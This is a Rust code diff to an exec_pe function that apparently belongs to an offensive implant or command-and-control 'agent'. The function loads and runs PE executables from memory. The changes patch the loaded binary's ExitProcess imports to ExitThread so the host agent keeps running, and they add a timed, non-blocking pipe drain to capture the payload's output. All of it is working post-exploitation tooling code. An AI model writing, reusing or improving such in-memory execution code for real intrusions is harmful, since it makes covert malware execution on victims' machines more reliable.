@@ -29,6 +29,14 @@ extern "system" {
         lpNumberOfBytesRead:    *mut u32,
         lpOverlapped:           *mut core::ffi::c_void,
     ) -> i32;
+    fn PeekNamedPipe(
+        hNamedPipe:             isize,
+        lpBuffer:               *mut u8,
+        nBufferSize:            u32,
+        lpBytesRead:            *mut u32,
+        lpTotalBytesAvail:      *mut u32,
+        lpBytesLeftThisMessage: *mut u32,
+    ) -> i32;
 }
 
 const STD_OUTPUT_HANDLE:  u32 = 0xFFFFFFF5u32;
@@ -260,6 +268,44 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
         }
     }
 
+    // ── Phase 5b: Patch ExitProcess → ExitThread in all IAT entries ─────────
+    // Without this, the loaded PE calls ExitProcess at program end and kills
+    // the entire agent process. Replacing it with ExitThread makes the PE's
+    // main thread exit cleanly while the agent continues.
+    if imp_va != 0 && imp_sz != 0 {
+        let k32_name = b"KERNEL32.DLL\0";
+        let k32 = LoadLibraryA(k32_name.as_ptr());
+        if k32 != 0 {
+            let exit_proc_name  = b"ExitProcess\0";
+            let exit_thread_name = b"ExitThread\0";
+            let exit_proc_addr = GetProcAddress(k32, exit_proc_name.as_ptr())
+                .map(|f| std::mem::transmute::<_, usize>(f) as u64)
+                .unwrap_or(0);
+            let exit_thread_addr = GetProcAddress(k32, exit_thread_name.as_ptr())
+                .map(|f| std::mem::transmute::<_, usize>(f) as u64)
+                .unwrap_or(0);
+            if exit_proc_addr != 0 && exit_thread_addr != 0 {
+                let mut desc = base_addr + imp_va as usize;
+                loop {
+                    let name_rva = *((desc + 12) as *const u32) as usize;
+                    let first_ft = *((desc + 16) as *const u32) as usize;
+                    if name_rva == 0 { break; }
+                    let iat_base = base_addr + first_ft;
+                    let mut j = 0usize;
+                    loop {
+                        let fn_addr = *((iat_base + j) as *const u64);
+                        if fn_addr == 0 { break; }
+                        if fn_addr == exit_proc_addr {
+                            *((iat_base + j) as *mut u64) = exit_thread_addr;
+                        }
+                        j += 8;
+                    }
+                    desc += 20;
+                }
+            }
+        }
+    }
+
     // ── Phase 6: Per-section memory protections ───────────────────────────────
 
     for i in 0..num_sections {
@@ -334,7 +380,10 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
         return "[+] PE executing (async \u{2014} entry point did not return within 30 s)".into();
     }
 
-    // ── Phase 8: Collect captured output ─────────────────────────────────────
+    // ── Phase 8: Collect captured output (non-blocking drain with timeout) ────
+    // The PE's CRT may duplicate the write handle for child threads/processes,
+    // so a plain blocking ReadFile loop can hang indefinitely. We use
+    // PeekNamedPipe to check availability and a deadline to avoid hanging.
 
     if !pipe_ok {
         return "[+] PE executed (output not captured)".into();
@@ -342,15 +391,28 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
 
     let mut output: Vec<u8> = Vec::with_capacity(4096);
     let mut tmp = [0u8; 4096];
-    let mut rd: u32 = 0;
-    while ReadFile(
-        pipe_read,
-        tmp.as_mut_ptr(),
-        tmp.len() as u32,
-        &mut rd,
-        std::ptr::null_mut(),
-    ) != 0 && rd > 0 {
-        output.extend_from_slice(&tmp[..rd as usize]);
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
+
+    // Drain what's already in the pipe (PeekNamedPipe + ReadFile)
+    loop {
+        if std::time::Instant::now() >= deadline { break; }
+        let mut avail: u32 = 0;
+        let peek_ok = unsafe {
+            PeekNamedPipe(pipe_read, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut())
+        };
+        if peek_ok == 0 { break; }  // pipe broken — EOF
+        if avail == 0 {
+            // No data yet; small sleep then retry
+            std::thread::sleep(std::time::Duration::from_millis(50));
+            continue;
+        }
+        let to_read = avail.min(tmp.len() as u32);
+        let mut rd: u32 = 0;
+        if unsafe { ReadFile(pipe_read, tmp.as_mut_ptr(), to_read, &mut rd, std::ptr::null_mut()) } != 0 && rd > 0 {
+            output.extend_from_slice(&tmp[..rd as usize]);
+        } else {
+            break;
+        }
     }
     CloseHandle(pipe_read);
 
